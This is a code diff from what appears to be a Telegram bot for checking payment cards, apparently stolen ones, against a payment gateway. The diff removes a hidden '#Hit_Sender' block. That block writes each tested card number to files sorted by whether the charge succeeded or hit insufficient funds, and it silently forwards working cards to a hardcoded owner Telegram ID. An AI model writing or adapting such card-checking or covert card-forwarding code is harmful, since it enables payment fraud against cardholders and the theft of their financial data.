@@ -89,35 +89,6 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 
 𝐓𝐢𝐦𝐞: <code>1{"{:.1f}".format(execution_time)} second</code> 
 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: @strawhatchannel96'''
-
-#Hit_Sender
-				# Main Owner ID
-				owner_id = 7805235233  #
-
-				# Card ရလာဒ်ကို Case-insensitive ဖြင့် စစ်ဆေးမယ်
-				card_info = f"💳 Card: {cc.strip()}"
-
-				if "succeeded" in last:
-				    # "thank" "Thank" "THANK" ပါရင် thank_cards.txt ထဲ သိမ်း
-				    with open("thank_cards.txt", "a") as thank_file:
-				        thank_file.write(card_info + "\n")
-
- 				   # "thank" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"✅ Thank Result Found:\n{card_info}")
-
-				elif "insufficient funds" in last.lower():
-				    # "insufficient funds" ပါရင် insufficient_cards.txt ထဲ သိမ်း
-				    with open("insufficient_cards.txt", "a") as insufficient_file:
- 				       insufficient_file.write(card_info + "\n")
-
-				    # "insufficient funds" ပါတဲ့ ကဒ်တွေကို Main Owner ဆီသို့ ပို့
-				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n{card_info}")
-
-				else:
-				    # အခြား result များကို other_cards.txt ထဲ သိမ်း
-				    with open("other_cards.txt", "a") as other_file:
- 				       other_file.write(card_info + "\n")
-#Hit_Sender
 				
 				print(last)
 				if 'Payment processed successfully' in last:
